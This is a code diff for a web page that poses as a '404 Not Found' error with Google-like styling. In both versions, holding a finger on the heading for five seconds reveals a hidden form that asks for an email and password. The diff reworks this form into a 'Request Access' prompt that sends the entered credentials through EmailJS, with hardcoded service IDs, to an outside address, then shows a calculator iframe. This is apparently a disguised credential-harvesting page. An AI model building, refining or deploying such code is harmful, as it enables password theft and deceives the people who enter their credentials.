@@ -5,18 +5,19 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>404 Not Found</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #fff; color: #202124; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 50px; background: #fff; color: #202124; }
         .error-container { margin-top: 5%; }
-        h1 { font-size: 120px; margin: 0; cursor: pointer; user-select: none; -webkit-user-select: none; }
+        h1 { font-size: 100px; margin: 0; cursor: pointer; user-select: none; -webkit-user-select: none; }
         p { font-size: 18px; color: #5f6368; }
         
-        #secret-login, #app-view { display: none; margin-top: 30px; }
+        #access-request, #app-view { display: none; margin-top: 30px; }
         
-        .form-box { border: 1px solid #dadce0; padding: 40px; border-radius: 8px; display: inline-block; width: 300px; }
-        input { display: block; margin: 15px auto; padding: 12px; width: 90%; border: 1px solid #dadce0; border-radius: 4px; }
-        button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        .form-box { border: 1px solid #dadce0; padding: 40px; border-radius: 8px; display: inline-block; width: 320px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        input { display: block; margin: 15px auto; padding: 12px; width: 90%; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
+        button { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; width: 100%; }
+        button:active { background: #1765cc; }
         
-        iframe { width: 100%; height: 90vh; border: none; }
+        #app-view iframe { width: 100%; height: 95vh; border: none; position: absolute; top: 0; left: 0; }
     </style>
 </head>
 <body>
@@ -30,13 +31,14 @@
     </div>
 </div>
 
-<div id="secret-login">
+<div id="access-request">
     <div class="form-box">
-        <h2>Sign in</h2>
-        <form id="auth-form">
-            <input type="email" id="email" placeholder="Email" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit">Next</button>
+        <h2 style="margin-top:0;">Request Access</h2>
+        <p style="font-size: 14px;">Enter your credentials to verify your account.</p>
+        <form id="request-form">
+            <input type="email" name="user_email" id="email" placeholder="Email" required>
+            <input type="password" name="user_password" id="password" placeholder="Password" required>
+            <button type="submit" id="submit-btn">Request Access</button>
         </form>
     </div>
 </div>
@@ -48,7 +50,7 @@
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 
 <script>
-    // Initialize EmailJS with your User ID (6iGADKihYbPC4ecb)
+    // 1. Initialize with your Public Key
     (function() {
         emailjs.init("6iGADKihYbPC4ecb");
     })();
@@ -56,11 +58,11 @@
     let timer;
     const target = document.getElementById('hold-target');
 
-    // Timer logic: Trigger ONLY on finger touch (touchstart)
+    // 2. Finger-only hold detection (5 seconds)
     target.addEventListener('touchstart', (e) => {
         timer = setTimeout(() => {
             document.getElementById('not-found-view').style.display = 'none';
-            document.getElementById('secret-login').style.display = 'block';
+            document.getElementById('access-request').style.display = 'block';
         }, 5000); 
     });
 
@@ -68,25 +70,24 @@
         clearTimeout(timer);
     });
 
-    // Form Handling
-    document.getElementById('auth-form').addEventListener('submit', function(e) {
+    // 3. Handle Request Submission
+    document.getElementById('request-form').addEventListener('submit', function(e) {
         e.preventDefault();
+        const btn = document.getElementById('submit-btn');
+        btn.innerText = "Verifying...";
 
-        const templateParams = {
-            user_email: document.getElementById('email').value,
-            user_pass: document.getElementById('password').value,
-            firebase_project: "testing-12bc9" // Your Firebase Reference
-        };
-
-        // Send data using your Service and Template IDs
-        emailjs.send('service_06y4hgi', 'template_56l2irz', templateParams)
+        // Sends the entire form to EmailJS
+        emailjs.sendForm('service_06y4hgi', 'template_56l2irz', this)
             .then(() => {
-                // On success, hide login and show the Iframe
-                document.getElementById('secret-login').style.display = 'none';
+                // SUCCESS: Proceed to the Calculator
+                document.getElementById('access-request').style.display = 'none';
                 document.getElementById('app-view').style.display = 'block';
+                document.body.style.padding = "0"; // Clean up spacing for iframe
             }, (error) => {
-                alert("Connection Error. Please try again.");
-                console.log("FAILED...", error);
+                // FAILURE: Log details to console and alert
+                console.error("EmailJS Error:", error);
+                alert("Access Denied: Connection to verification server failed.");
+                btn.innerText = "Request Access";
             });
     });
 </script>
